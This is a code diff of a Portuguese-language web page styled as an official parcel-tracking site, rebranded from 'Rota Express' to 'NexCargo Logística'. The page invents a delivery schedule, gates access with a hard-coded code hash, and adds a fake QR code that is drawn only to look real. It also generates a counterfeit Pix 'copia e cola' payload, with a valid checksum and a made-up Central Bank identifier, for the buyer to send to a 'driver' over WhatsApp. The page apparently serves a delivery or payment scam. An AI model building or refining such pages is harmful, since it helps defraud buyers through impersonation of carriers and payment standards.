@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#08121F">
-<title>ROTA EXPRESS · Rastreamento Oficial</title>
+<title>NEXCARGO LOGÍSTICA · Rastreamento Oficial</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@100..125,500..900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -154,6 +154,7 @@
   .t-time{display:inline-flex;align-items:center;gap:5px;font-size:11.5px;font-weight:600;color:var(--mut2);margin-top:5px;background:var(--s2);padding:3px 8px;border-radius:7px}
   .t-step.now .t-time{color:var(--acc);background:rgba(245,165,36,.1)}
 
+  /* ---------- Cartão de Validação Digital + QR Code Visual + Copia e Cola ---------- */
   .pending-card{margin-top:16px;background:linear-gradient(145deg,rgba(245,165,36,.12),rgba(245,165,36,.04));border:1.5px solid rgba(245,165,36,.42);border-radius:20px;padding:16px;transition:.3s}
   .pc-head{display:flex;align-items:center;gap:12px}
   .pc-ic{width:44px;height:44px;border-radius:13px;background:rgba(245,165,36,.18);color:var(--acc);display:grid;place-items:center;flex:none}
@@ -164,13 +165,23 @@
 
   .token-panel{display:none;margin-top:16px;padding-top:16px;border-top:1px dashed rgba(43,212,125,.35);animation:fadeIn .35s ease}
   .token-panel.show{display:block}
-  .token-status{display:inline-flex;align-items:center;gap:6px;background:rgba(43,212,125,.16);border:1px solid rgba(43,212,125,.4);color:#5FE3A0;font-size:11.5px;font-weight:800;padding:6px 12px;border-radius:999px;margin-bottom:12px}
-  .token-box{background:var(--bg);border:1.5px solid rgba(43,212,125,.45);border-radius:16px;padding:14px;display:flex;align-items:center;justify-content:space-between;gap:10px}
-  .token-box small{display:block;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--mut)}
-  .token-box b{display:block;font-family:var(--head);font-stretch:115%;font-size:17px;font-weight:900;color:var(--tx);letter-spacing:.8px;margin-top:3px;word-break:break-all}
-  .copy-btn{background:var(--s2);border:1px solid var(--line2);color:var(--tx);border-radius:12px;padding:10px 12px;font-family:var(--head);font-size:12.5px;font-weight:800;cursor:pointer;display:inline-flex;align-items:center;gap:6px;flex:none;transition:.15s}
-  .copy-btn:active{transform:scale(.95);border-color:var(--ok)}
-  .copy-btn .ic{color:var(--ok)}
+  .token-status{display:inline-flex;align-items:center;gap:6px;background:rgba(43,212,125,.16);border:1px solid rgba(43,212,125,.4);color:#5FE3A0;font-size:11.5px;font-weight:800;padding:6px 12px;border-radius:999px;margin-bottom:14px}
+
+  /* QR Code Visual Estilo EMV/Pix */
+  .qr-visual-card{background:var(--bg);border:1.5px solid rgba(43,212,125,.4);border-radius:18px;padding:16px;text-align:center;margin-bottom:12px}
+  .qr-frame{display:inline-flex;align-items:center;justify-content:center;background:#FFFFFF;padding:12px;border-radius:16px;box-shadow:0 12px 30px rgba(0,0,0,.45);border:3px solid rgba(43,212,125,.6)}
+  .qr-frame svg{display:block;width:164px;height:164px}
+  .qr-caption{margin-top:10px;font-size:12px;color:#C8D3E3;line-height:1.4}
+  .qr-caption strong{color:var(--tx)}
+
+  /* Bloco Copia e Cola Padrão BR Code / EMV */
+  .emv-box{background:var(--bg);border:1.5px solid rgba(43,212,125,.45);border-radius:16px;padding:14px}
+  .emv-head{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:8px}
+  .emv-head small{font-size:10.5px;font-weight:800;text-transform:uppercase;letter-spacing:.9px;color:#5FE3A0;display:flex;align-items:center;gap:5px}
+  .emv-payload{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;font-size:11.5px;line-height:1.45;color:var(--tx);background:rgba(14,27,46,.9);border:1px solid var(--line2);border-radius:11px;padding:10px 11px;word-break:break-all;user-select:all;max-height:86px;overflow-y:auto}
+  .copy-btn-full{margin-top:10px;width:100%;background:var(--s2);border:1px solid rgba(43,212,125,.45);color:var(--tx);border-radius:12px;padding:12px 14px;font-family:var(--head);font-size:13.5px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;transition:.15s}
+  .copy-btn-full:active{transform:scale(.97);border-color:var(--ok)}
+  .copy-btn-full .ic{color:var(--ok)}
 
   .steps-guide{margin-top:12px;background:rgba(8,18,31,.55);border:1px solid var(--line);border-radius:14px;padding:12px}
   .steps-guide div{display:flex;align-items:flex-start;gap:9px;font-size:12.5px;color:#D6DFEC;line-height:1.4}
@@ -209,7 +220,7 @@
     <div class="appbar">
       <div class="logo">
         <div class="logo-mark"><svg class="ic"><use href="#i-truck"/></svg></div>
-        <div class="logo-txt">ROTA<br><span>EXPRESS</span></div>
+        <div class="logo-txt">NEXCARGO<br><span>LOGÍSTICA</span></div>
       </div>
       <div class="status-pill"><i class="pulse-dot"></i>SISTEMA ONLINE</div>
     </div>
@@ -231,7 +242,7 @@
         <g transform="translate(52 62) scale(.62)">
           <rect x="0" y="8" width="210" height="104" rx="6" fill="#E8EEF5"/>
           <rect x="16" y="42" width="178" height="36" rx="4" fill="#0E1B2E"/>
-          <text x="105" y="66" text-anchor="middle" style="font-family:Archivo,sans-serif;font-weight:900;font-size:18px;fill:#fff;letter-spacing:1px">ROTA EXPRESS</text>
+          <text x="105" y="66" text-anchor="middle" style="font-family:Archivo,sans-serif;font-weight:900;font-size:15px;fill:#fff;letter-spacing:1px">NEXCARGO LOG</text>
           <rect x="16" y="78" width="178" height="5" fill="#F5A524"/>
           <path d="M222 28 h40 c11 0 18 5 23 14 l15 30 c3 5 4 9 4 15 v25 c0 4-3 6-6 6 h-76z" fill="#F5A524"/>
           <path d="M262 39 h13 c5 0 9 3 11 7 l11 24 h-35z" fill="#162842"/>
@@ -282,7 +293,7 @@
 
       <div class="hint-note">
         <svg class="ic sm"><use href="#i-shield"/></svg>
-        <span>Seu progresso e chave ficam salvos localmente no navegador.</span>
+        <span>Seu progresso, QR Code e chave ficam salvos localmente no navegador.</span>
       </div>
     </div>
 
@@ -349,12 +360,12 @@
     <!-- Etapas de Rota -->
     <div class="section-t">
       <div class="h">Etapas da Rota</div>
-      <small id="resRegion">Rota Express · Unidade Destino</small>
+      <small id="resRegion">NexCargo Logística · Unidade Destino</small>
     </div>
 
     <div class="timeline" id="routeTimeline"></div>
 
-    <!-- Status Inferior: Validação Digital (Gera código para enviar ao entregador e receber o QR Code para leitura) -->
+    <!-- Status Inferior: Validação Digital (QR Code Visual + Copia e Cola EMV/Pix Fictício + Envio ao Entregador) -->
     <div class="pending-card" id="pendingBox">
       <div class="pc-head">
         <div class="pc-ic" id="pendingIcon"><svg class="ic lg"><use href="#i-qr"/></svg></div>
@@ -363,27 +374,37 @@
           <b id="pendingTitle">Liberação exclusiva na entrega</b>
         </div>
       </div>
-      <p id="pendingDesc">Para garantir a segurança, gere seu <strong>código de solicitação</strong> vinculado ao pedido e envie ao entregador. Com ele, o entregador enviará o <strong>QR Code exclusivo</strong> para você realizar a leitura no momento da entrega do equipamento. <strong>O pagamento é realizado somente no ato da entrega.</strong></p>
+      <p id="pendingDesc">Para garantir a segurança, gere seu <strong>QR Code e código copia e cola de validação</strong> vinculados ao pedido e envie ao entregador. Com ele, o entregador validará a entrega e enviará o <strong>QR Code exclusivo</strong> para leitura no ato do recebimento. <strong>O pagamento é realizado somente no ato da entrega.</strong></p>
 
       <button class="btn btn-primary" id="btnValidate" onclick="generateValidationKey()">
-        <svg class="ic"><use href="#i-key"/></svg> Gerar código para o entregador
+        <svg class="ic"><use href="#i-key"/></svg> Gerar QR Code e código para o entregador
       </button>
 
       <div class="token-panel" id="tokenPanel">
-        <div class="token-status"><svg class="ic sm"><use href="#i-check"/></svg> Código de liberação gerado</div>
+        <div class="token-status"><svg class="ic sm"><use href="#i-check"/></svg> QR Code &amp; Código Copia e Cola gerados</div>
 
-        <div class="token-box">
-          <div>
-            <small>Envie este código ao entregador</small>
-            <b id="driverKeyText">---</b>
+        <!-- QR Code Visual -->
+        <div class="qr-visual-card">
+          <div class="qr-frame" id="qrVisualBox"></div>
+          <div class="qr-caption">
+            <strong>QR Code de Validação · NexCargo Logística</strong><br>
+            Protocolo vinculado ao pedido <span id="qrOrderBadge">---</span>
           </div>
-          <button type="button" class="copy-btn" onclick="copyDriverKey()">
-            <svg class="ic sm"><use href="#i-copy"/></svg> Copiar
+        </div>
+
+        <!-- Código Copia e Cola Estilo EMV / BR Code Fictício -->
+        <div class="emv-box">
+          <div class="emv-head">
+            <small><svg class="ic sm"><use href="#i-qr"/></svg> Código Copia e Cola (Chave Digital)</small>
+          </div>
+          <div class="emv-payload" id="driverEmvPayload">---</div>
+          <button type="button" class="copy-btn-full" onclick="copyDriverKey()">
+            <svg class="ic sm"><use href="#i-copy"/></svg> Copiar código copia e cola
           </button>
         </div>
 
         <div class="steps-guide">
-          <div><span class="num">1</span><span>Copie ou envie este código ao entregador responsável pela sua rota.</span></div>
+          <div><span class="num">1</span><span>Copie ou envie este código copia e cola ao entregador responsável pela sua rota.</span></div>
           <div><span class="num">2</span><span>Após receber o código, <strong>o entregador enviará o QR Code exclusivo</strong> para você realizar a leitura no ato da entrega do equipamento.</span></div>
           <div><span class="num">3</span><span>Conferido o equipamento, <strong>o pagamento é realizado somente no ato da entrega</strong>.</span></div>
         </div>
@@ -442,10 +463,10 @@
 
   /* Hash SHA-256 do código único exclusivo */
   const SECRET_CODE_HASH = "38a47d4797a027fa0587d2899c029904453c1fe531f97228e6da4d07a0befd99";
-  const CACHE_STORAGE_KEY = "ROTA_EXPRESS_PERFIL_CACHE_V1";
+  const CACHE_STORAGE_KEY = "NEXCARGO_LOGISTICA_PERFIL_CACHE_V1";
 
   let activeCode = "";
-  let activeDriverCode = "";
+  let activeDriverPayload = "";
   let currentProfile = null;
 
   async function sha256Hex(str) {
@@ -460,6 +481,127 @@
       h = Math.imul(h, 0x01000193);
     }
     return (h >>> 0).toString(16).padStart(8, "0");
+  }
+
+  /* Calcula CRC16-CCITT (0xFFFF) idêntico ao padrão BR Code / EMV */
+  function crc16CCITT(str) {
+    let crc = 0xFFFF;
+    for (let i = 0; i < str.length; i++) {
+      crc ^= (str.charCodeAt(i) << 8);
+      for (let j = 0; j < 8; j++) {
+        if ((crc & 0x8000) !== 0) {
+          crc = ((crc << 1) ^ 0x1021) & 0xFFFF;
+        } else {
+          crc = (crc << 1) & 0xFFFF;
+        }
+      }
+    }
+    return crc.toString(16).toUpperCase().padStart(4, '0');
+  }
+
+  function emvTag(id, value) {
+    const len = String(value.length).padStart(2, '0');
+    return `${id}${len}${value}`;
+  }
+
+  /* Gera string fictícia no formato exato de Copia e Cola BR Code / EMV */
+  function buildFictionalEmvCopiaECola(orderCode) {
+    const cleanCode = orderCode.replace(/[^A-Z0-9]/gi, '').toUpperCase();
+    const gui = emvTag('00', 'br.gov.bcb.pix.frete_gratis');
+    const url = emvTag('25', `validador-entrega.nexcargologistica.com.br/qr/v2/auth-${cleanCode.toLowerCase()}`);
+    const merchantAccount = emvTag('26', gui + url);
+
+    const payloadWithoutCrc =
+      emvTag('00', '01') +
+      emvTag('01', '12') +
+      merchantAccount +
+      emvTag('52', '0000') +
+      emvTag('53', '986') +
+      emvTag('58', 'BR') +
+      emvTag('59', 'NEXCARGO LOGISTICA LTDA') +
+      emvTag('60', 'SAO PAULO') +
+      emvTag('62', emvTag('05', `LIB${cleanCode}`)) +
+      '6304';
+
+    return payloadWithoutCrc + crc16CCITT(payloadWithoutCrc);
+  }
+
+  /* Gera SVG nítido de QR Code determinístico baseado no payload */
+  function buildVisualQrSvg(seedText) {
+    const size = 29;
+    const grid = Array.from({ length: size }, () => Array(size).fill(0));
+    const reserved = Array.from({ length: size }, () => Array(size).fill(false));
+
+    function placeFinder(r0, c0) {
+      for (let r = -1; r <= 7; r++) {
+        for (let c = -1; c <= 7; c++) {
+          const rr = r0 + r, cc = c0 + c;
+          if (rr < 0 || rr >= size || cc < 0 || cc >= size) continue;
+          reserved[rr][cc] = true;
+          const inOuter = r >= 0 && r <= 6 && c >= 0 && c <= 6;
+          const onBorder = r === 0 || r === 6 || c === 0 || c === 6;
+          const inCore = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+          grid[rr][cc] = (inOuter && (onBorder || inCore)) ? 1 : 0;
+        }
+      }
+    }
+
+    placeFinder(0, 0);
+    placeFinder(0, size - 7);
+    placeFinder(size - 7, 0);
+
+    // Padrão de alinhamento interno
+    for (let r = size - 9; r <= size - 5; r++) {
+      for (let c = size - 9; c <= size - 5; c++) {
+        reserved[r][c] = true;
+        const dr = Math.abs(r - (size - 7));
+        const dc = Math.abs(c - (size - 7));
+        grid[r][c] = (Math.max(dr, dc) === 2 || (dr === 0 && dc === 0)) ? 1 : 0;
+      }
+    }
+
+    // Faixas de sincronismo (timing patterns)
+    for (let i = 8; i < size - 8; i++) {
+      reserved[6][i] = true;
+      grid[6][i] = i % 2 === 0 ? 1 : 0;
+      reserved[i][6] = true;
+      grid[i][6] = i % 2 === 0 ? 1 : 0;
+    }
+
+    // Hash determinístico para preencher os módulos de dados
+    let h = 2166136261;
+    for (let i = 0; i < seedText.length; i++) {
+      h ^= seedText.charCodeAt(i);
+      h = Math.imul(h, 16777619);
+    }
+
+    for (let r = 0; r < size; r++) {
+      for (let c = 0; c < size; c++) {
+        if (reserved[r][c]) continue;
+        if (r >= 12 && r <= 16 && c >= 12 && c <= 16) continue;
+        h ^= (r * 37 + c * 17 + seedText.charCodeAt((r + c) % seedText.length));
+        h = Math.imul(h, 16777619) >>> 0;
+        grid[r][c] = ((h >>> ((r + c) % 16)) & 1);
+      }
+    }
+
+    let rects = '';
+    for (let r = 0; r < size; r++) {
+      for (let c = 0; c < size; c++) {
+        if (grid[r][c] === 1) {
+          rects += `<rect x="${c}" y="${r}" width="1.02" height="1.02" rx="0.18"/>`;
+        }
+      }
+    }
+
+    return `
+      <svg viewBox="-1.5 -1.5 ${size + 3} ${size + 3}" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+        <rect x="-1.5" y="-1.5" width="${size + 3}" height="${size + 3}" fill="#FFFFFF"/>
+        <g fill="#08121F">${rects}</g>
+        <rect x="11.6" y="11.6" width="5.8" height="5.8" rx="1.2" fill="#08121F"/>
+        <text x="14.5" y="15.4" text-anchor="middle" style="font-family:Archivo,sans-serif;font-weight:900;font-size:2.6px;fill:#F5A524;letter-spacing:0.1px">NC</text>
+      </svg>
+    `;
   }
 
   /* Animação suave da pista */
@@ -480,7 +622,7 @@
   function formatHHMM(d){ return `${pad2(d.getHours())}:${pad2(d.getMinutes())}`; }
 
   /* Monta dinamicamente data de amanhã, horário estimado e etapas com base na data/hora atual */
-  function buildDynamicSchedule(code, existingKeyGenerated = false, existingDriverCode = "") {
+  function buildDynamicSchedule(code, existingKeyGenerated = false, existingPayload = "") {
     const now = new Date();
     const yesterday = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1);
     const tomorrow = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1);
@@ -496,13 +638,13 @@
 
     return {
       code,
-      driverCode: existingDriverCode || `LIB-${code}`,
+      driverPayload: existingPayload || buildFictionalEmvCopiaECola(code),
       keyGenerated: Boolean(existingKeyGenerated),
       savedAtISO: now.toISOString(),
       consultStamp: `Salvo às ${formatHHMM(now)}`,
       date: `Amanhã, ${formatFullDate(tomorrow)}`,
       time: deliveryWindow,
-      region: 'Rota Express · Dia Seguinte',
+      region: 'NexCargo Logística · Dia Seguinte',
       steps: [
         {
           state: 'done',
@@ -569,7 +711,7 @@
     }
     currentProfile = cached;
     $('spCode').textContent = cached.code;
-    $('spDate').textContent = cached.keyGenerated ? 'Chave gerada · Salvo' : (cached.date || 'Salvo no cache');
+    $('spDate').textContent = cached.keyGenerated ? 'QR Code & Chave salvos' : (cached.date || 'Salvo no cache');
     box.classList.add('show');
   }
 
@@ -580,7 +722,7 @@
       return;
     }
     activeCode = cached.code;
-    activeDriverCode = cached.driverCode || `LIB-${cached.code}`;
+    activeDriverPayload = cached.driverPayload || buildFictionalEmvCopiaECola(cached.code);
     currentProfile = cached;
     renderResult(cached, true);
     showScreen('result');
@@ -591,7 +733,7 @@
     const updated = buildDynamicSchedule(
       activeCode,
       currentProfile ? currentProfile.keyGenerated : false,
-      activeDriverCode
+      activeDriverPayload
     );
     saveProfileCache(updated);
     renderResult(updated, false);
@@ -630,10 +772,12 @@
 
     const existing = loadProfileCache();
     const alreadyGenerated = Boolean(existing && existing.code === raw && existing.keyGenerated);
-    const existingKey = (existing && existing.code === raw && existing.driverCode) ? existing.driverCode : `LIB-${raw}`;
+    const existingPayload = (existing && existing.code === raw && existing.driverPayload)
+      ? existing.driverPayload
+      : buildFictionalEmvCopiaECola(raw);
 
     activeCode = raw;
-    activeDriverCode = existingKey;
+    activeDriverPayload = existingPayload;
 
     $('loadCodeDisplay').textContent = activeCode;
     $('loadBar').style.width = '0%';
@@ -653,7 +797,7 @@
     }
 
     await wait(250);
-    const schedule = buildDynamicSchedule(activeCode, alreadyGenerated, activeDriverCode);
+    const schedule = buildDynamicSchedule(activeCode, alreadyGenerated, activeDriverPayload);
     saveProfileCache(schedule);
     renderResult(schedule, false);
     showScreen('result');
@@ -665,7 +809,7 @@
     }
   }
 
-  function applyGeneratedKeyUI(driverCode) {
+  function applyGeneratedKeyUI(payloadStr) {
     const box = $('pendingBox');
     box.style.background = 'linear-gradient(145deg,rgba(43,212,125,.14),rgba(43,212,125,.05))';
     box.style.borderColor = 'rgba(43,212,125,.42)';
@@ -674,11 +818,13 @@
     $('pendingTag').textContent = 'Pronto para Envio';
     $('pendingTag').style.background = 'var(--ok)';
     $('pendingTag').style.color = '#052212';
-    $('pendingTitle').textContent = 'Código de solicitação gerado';
+    $('pendingTitle').textContent = 'QR Code e código copia e cola gerados';
     $('pendingDesc').style.display = 'none';
     $('btnValidate').style.display = 'none';
 
-    $('driverKeyText').textContent = driverCode;
+    $('qrOrderBadge').textContent = activeCode;
+    $('qrVisualBox').innerHTML = buildVisualQrSvg(payloadStr);
+    $('driverEmvPayload').textContent = payloadStr;
     $('tokenPanel').classList.add('show');
   }
 
@@ -712,40 +858,40 @@
     $('pendingTag').style.background = 'var(--acc)';
     $('pendingTag').style.color = 'var(--accInk)';
     $('pendingTitle').textContent = 'Liberação exclusiva na entrega';
-    $('pendingDesc').innerHTML = 'Para garantir a segurança, gere seu <strong>código de solicitação</strong> vinculado ao pedido e envie ao entregador. Com ele, o entregador enviará o <strong>QR Code exclusivo</strong> para você realizar a leitura no momento da entrega do equipamento. <strong>O pagamento é realizado somente no ato da entrega.</strong>';
+    $('pendingDesc').innerHTML = 'Para garantir a segurança, gere seu <strong>QR Code e código copia e cola de validação</strong> vinculados ao pedido e envie ao entregador. Com ele, o entregador validará a entrega e enviará o <strong>QR Code exclusivo</strong> para leitura no ato do recebimento. <strong>O pagamento é realizado somente no ato da entrega.</strong>';
     $('pendingDesc').style.display = 'block';
 
     const btn = $('btnValidate');
     btn.style.display = 'flex';
     btn.disabled = false;
-    btn.innerHTML = `${icon('i-key')} Gerar código para o entregador`;
+    btn.innerHTML = `${icon('i-key')} Gerar QR Code e código para o entregador`;
     $('tokenPanel').classList.remove('show');
 
     if (data.keyGenerated) {
-      applyGeneratedKeyUI(data.driverCode);
+      applyGeneratedKeyUI(data.driverPayload);
     }
   }
 
   function generateValidationKey(){
     const btn = $('btnValidate');
     btn.disabled = true;
-    btn.innerHTML = `<span class="btn-spin"></span> Gerando código de liberação...`;
+    btn.innerHTML = `<span class="btn-spin"></span> Gerando QR Code e código...`;
 
     setTimeout(() => {
-      applyGeneratedKeyUI(activeDriverCode);
+      applyGeneratedKeyUI(activeDriverPayload);
       if (currentProfile) {
         currentProfile.keyGenerated = true;
-        currentProfile.driverCode = activeDriverCode;
+        currentProfile.driverPayload = activeDriverPayload;
         saveProfileCache(currentProfile);
       }
-      toast('Código gerado e salvo no perfil!');
+      toast('QR Code e código salvos no perfil!');
     }, 900);
   }
 
   function copyDriverKey(){
-    const text = activeDriverCode;
+    const text = activeDriverPayload;
     if(navigator.clipboard && navigator.clipboard.writeText){
-      navigator.clipboard.writeText(text).then(() => toast('Código copiado!')).catch(() => fallbackCopy(text));
+      navigator.clipboard.writeText(text).then(() => toast('Código copia e cola copiado!')).catch(() => fallbackCopy(text));
     } else {
       fallbackCopy(text);
     }
@@ -758,13 +904,13 @@
     ta.select();
     document.execCommand('copy');
     document.body.removeChild(ta);
-    toast('Código copiado!');
+    toast('Código copia e cola copiado!');
   }
 
   function shareToDriver(){
-    const msg = `Olá! Segue meu código de validação digital do pedido *${activeCode}*: *${activeDriverCode}*. Aguardo o QR Code exclusivo para leitura no ato da entrega.`;
+    const msg = `Olá! Segue meu código de validação digital do pedido *${activeCode}* (NexCargo Logística):\n\n${activeDriverPayload}\n\nAguardo o QR Code exclusivo para leitura no ato da entrega.`;
     if(navigator.share){
-      navigator.share({ title: 'Validação Digital · Rota Express', text: msg }).catch(()=>{});
+      navigator.share({ title: 'Validação Digital · NexCargo Logística', text: msg }).catch(()=>{});
     } else {
       copyDriverKey();
       window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, '_blank');
